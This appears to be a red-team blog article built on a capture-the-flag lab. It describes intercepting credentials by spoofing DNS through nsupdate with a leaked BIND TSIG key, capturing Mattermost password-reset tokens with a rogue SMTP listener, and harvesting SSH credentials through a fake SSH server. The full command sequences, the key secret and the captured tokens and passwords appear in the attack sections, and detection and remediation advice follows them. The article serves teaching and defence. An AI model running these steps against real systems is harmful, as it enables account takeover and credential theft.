---
title: "Intercepting Credentials — DNS Manipulation, Password Resets and SSH Honeypots"
description: "Three techniques for intercepting credentials in environments that assume their infrastructure is trustworthy: abusing BIND's dynamic update capability to redirect a mail subdomain, capturing password reset tokens through SMTP interception, and harvesting SSH credentials via chat bot provisioning features pointed at fake SSH servers. Each technique exploits a gap between what the infrastructure is supposed to do and what it can be made to do."
date: 2026-10-26
type: "Technique · Credential Access"
category: "Red Team"
difficulty: "Intermediate"
readingTime: 15
tags: [credential-access, dns-spoofing, bind, mattermost, smtp-interception, ssh-honeypot, password-reset]
draft: false
---

## The premise

Credentials are usually the last thing attackers need and the first thing environments are designed to protect. Passwords are hashed, tokens have expiration, TLS protects the wire. The protection assumes the environment is trustworthy: the DNS resolves correctly, the mail server delivers only to the intended recipient, the SSH connection goes to the intended host.

When that assumption is broken — through a leaked update key, an offline service, or a misconfigured bot — the credentials become available without any cryptographic break. The attacker does not need to crack anything. They just need to be in the right position to receive what the environment sends.

This article covers three techniques that exploit that position:

- **DNS manipulation via dynamic updates.** BIND's `allow-update` directive is meant to permit legitimate zone changes. When it is combined with a leaked rndc-key and no restriction on what records can be modified, it becomes a redirection primitive.
- **SMTP interception for password resets.** Password reset flows send tokens by email. When the mail infrastructure is offline or redirectable, the tokens become attacker-controlled.
- **SSH credential harvesting through chat bots.** Provisioning features in collaboration tools connect to servers with stored credentials. When the target is configurable, the connection can be pointed at an attacker-controlled listener.

For the full assessment that combined all three techniques, see: **[DNS Spoofing to Root — LFI, Credential Interception and Two Chained CVEs →](/projects/dns-spoofing-to-root-compromise)**.

## Part One — BIND dynamic updates

BIND's `allow-update` directive permits zone modifications without manual file edits. The mechanism is intended for environments where records change frequently — dynamic DNS for workstations, automated certificate validation, and similar cases. The directive accepts either an IP-based access control list or a TSIG key reference:

```conf
zone "example.com" IN {
    type master;
    file "/var/lib/bind/db.example.com";
    allow-update { key "rndc-key"; };
};
```

The `key "rndc-key"` reference means: anyone presenting the correct TSIG signature for the key named `rndc-key` can add, delete, or modify records in this zone. There is no per-record restriction, no restriction on which types of records can be created, and no restriction on the values.

The key is defined in the same configuration file:

```conf
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

This is where the vulnerability lives. The secret is a static value, stored in a configuration file, with no rotation and no scope restriction. If the file is readable — through an LFI, a backup exposure, a misconfigured share — the key is compromised, and the zone is compromised.

## Part Two — DNS spoofing via nsupdate

The `nsupdate` tool implements the RFC 2136 protocol for dynamic DNS updates. Given the correct key and a reachable server, it modifies the zone directly:

```bash
nsupdate -y hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA= << 'EOF'
server 10.129.229.5
zone snoopy.htb
update delete mail.snoopy.htb A
update add mail.snoopy.htb 120 IN A 10.10.15.127
send
EOF
```

The sequence of commands is significant. The `update delete` removes the existing A record for `mail.snoopy.htb`. The `update add` creates a new A record with a 120-second TTL pointing at the attacker's IP. The short TTL is deliberate: it makes the change easy to revert and harder to detect in caches.

For the redirection to be effective, the target application has to resolve `mail.snoopy.htb` dynamically. If the application has cached the IP, or if it is pinned to a fixed value, the redirection has no effect. In the assessment, the Mattermost instance resolved the mail subdomain on each password reset — which made it vulnerable to the redirect.

The 120-second TTL means the window for interception is short. In practice, the tester has to trigger the target action immediately after the DNS update, before any cache expires or the update is noticed.

## Part Three — Password reset interception

Mattermost's password reset flow is standard: the user submits their email address, the server generates a token, and the server sends the token by email. The token is valid for 24 hours and single-use. The email contains a link like:

```
http://mm.example.com/reset_password_complete?token=<token>
```

If the email reaches an attacker, the token is available, and the password can be reset.

The attack requires three conditions:

- The email domain resolves to an attacker-controlled IP.
- The attacker runs a listener on the mail port (SMTP, usually 25).
- The attacker triggers the reset immediately after the DNS update.

In the assessment, all three were present. The mail domain `mail.snoopy.htb` was pointing at an IP that was not serving SMTP — the mail server was offline. This is the detail that made the attack possible: the environment had already given up on the mail server, but the application still relied on DNS to reach it.

The exploit sequence:

```bash
# 1. Listener first
sudo python3 -m aiosmtpd -n -l 0.0.0.0:25 &

# 2. DNS update
nsupdate -y hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA= << 'EOF'
server 10.129.229.5
zone snoopy.htb
update delete mail.snoopy.htb A
update add mail.snoopy.htb 120 IN A 10.10.15.127
send
EOF

# 3. Trigger the reset
curl -s -X POST -H "Host: mm.snoopy.htb" -H "Content-Type: application/json" \
  -d '{"email":"sbrown@snoopy.htb"}' \
  http://10.129.229.5/api/v4/users/password/reset/send
```

The listener receives:

```
Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3D75xgcoo9an556xpbzatew9affdqcfw9ueu75nfge6joyrkynpckho8hpff48ndat )
```

The token is now available. The tester submits it to the reset API and sets a new password.

### User enumeration via reset responses

The reset form itself leaks user existence. When the email does not exist, the response is generic: "We sent you an email." When the email does exist but the SMTP backend fails, the response is specific: "Failed to send password reset."

This difference allows an attacker to determine which email addresses are valid accounts, without triggering a reset email that would alert the user. The enumeration is silent — the failed attempt does not generate a security event.

![The application shows a generic message when the email does not exist](/images/articles/dns-spoofing-to-root-compromise/mattermost-fake-email.png)

![The specific message appears when the email exists but the delivery fails](/images/articles/dns-spoofing-to-root-compromise/mattermost-real-email.png)

For the attacker, this makes targeting trivial. For the defender, it means that any environment where mail delivery is unreliable is also an environment where user enumeration is possible through the reset form.


## Part Four — SSH honeypot credentials

The Mattermost instance had a "Server Provisioning" feature that allowed users to trigger remote provisioning actions through a chat command. The feature accepted a target host and port, connected to that target over SSH using stored credentials, and executed a predefined script.

The provisioner had no restriction on what target could be configured. Any user with access to the provisioning channel could point the bot at any server. When pointed at an attacker-controlled SSH listener, the bot presented its stored credentials during the connection — which the listener captured.

The listener is a fake SSH server that accepts any authentication attempt and logs the credentials. The `sshesame` tool implements this pattern:

```yaml
server:
  listen_address: "0.0.0.0:2222"
  host_keys: null
```

```bash
sshesame -config config.yaml
INFO 2026/10/16 15:49:31 Listening on [::]:2222
```

The bot connects to the fake server with `cbrown`'s credentials:

```
cbrown sn00pedcr3dential!!!
```

The credentials are now in the attacker's hands. The bot is not aware that it was spoofed — it followed its normal flow, connecting to the target and attempting to run the provisioning command. From the application's perspective, nothing went wrong.

### Why the provisioning feature is an attack surface

The feature was designed to help administrators manage servers. It assumes:

- The user configuring the target is trusted.
- The target host is the intended host.
- The stored credentials are safe because they are never displayed.

None of these assumptions hold once an attacker has access to the provisioning channel. The first breaks because the attacker is now a user. The second breaks because the target is configurable. The third breaks because the credentials are transmitted to the target over a protocol that can be observed by whoever controls the target.

The general pattern is broader than Mattermost. Any application that:

- Stores credentials for connecting to external services,
- Allows the destination to be configured by a user,
- And performs the connection without validating the destination

is vulnerable to the same class of attack. The user does not need to see the credentials — they just need to control where the credentials go.

## Part Five — Detection

The three techniques share a detection model: cross-referencing what was supposed to happen with what actually happened.

**For DNS manipulation:**

- BIND logs every `nsupdate` request in the `update` log category. A pattern of `update delete` followed by `update add` for a mail or authentication subdomain is suspicious.
- Zone file integrity checks: periodic snapshots of the zone file, compared against the expected content. Any record that was not manually changed but appears modified is worth investigating.
- Network flows: DNS queries for `mail.<domain>` coming from application servers that normally resolve it from cache or from a fixed configuration.

**For password reset interception:**

- Mail server logs: any successful SMTP connection to the mail port that is not from the legitimate mail server.
- Application logs: password resets triggered for accounts that did not request them.
- DNS records: any change to the MX record or the A record for the mail subdomain, logged against the rndc-key.

**For SSH honeypot credential harvesting:**

- Application logs: the provisioning feature should log every target configuration change. A new target pointing at an IP outside the expected inventory is a red flag.
- Network flows: outbound SSH from the provisioning host to IPs that are not in the inventory.
- Credential rotation: any credential used by a provisioning bot should be rotated when the target configuration changes. This limits the window of exposure if the bot is compromised.

The common thread: the attacker's actions are legitimate from the perspective of the individual component. The bot connected to the target it was told to connect to. The DNS server accepted the update it was authorized to accept. The mail server received the connection it was sent. Detection requires correlating what each component did with what it was supposed to do — not with whether the component behaved correctly.

## Takeaway

Credentials are usually described as a cryptographic problem: hashing, encryption, token expiration. The three techniques in this article have nothing to do with cryptography. They are about the environment in which credentials are exchanged — the DNS that resolves the mail server, the SMTP listener that accepts the connection, the SSH target that receives the bot.

The environmental assumptions are usually invisible. The DNS resolves correctly because the zone file is correct. The mail server delivers correctly because it is running. The bot connects correctly because the target is what it says it is. Each assumption holds in isolation. Each can be broken independently.

The first assumption — DNS resolves correctly — breaks when the zone allows dynamic updates without scope restriction. The fix is `update-policy` instead of `allow-update`, with per-record restrictions and key rotation.

The second assumption — mail delivers correctly — breaks when the mail server is offline but the application still uses DNS to reach it. The fix is failing closed when mail is unavailable, and requiring multi-factor for account recovery.

The third assumption — the bot connects correctly — breaks when the bot's target is user-configurable. The fix is removing the configurability, or validating the destination against a strict inventory.

None of these fixes are exotic. All of them are operational. The gap between what the environment is supposed to do and what it can be made to do is the gap that attackers operate in.

For the assessment that chained all three techniques into full root compromise, see: **[DNS Spoofing to Root →](/projects/dns-spoofing-to-root-compromise)**. For the privilege escalations that followed, see: **[Git Symlinks and ClamAV XXE →](/research/git-symlink-clamav-xxe)**.
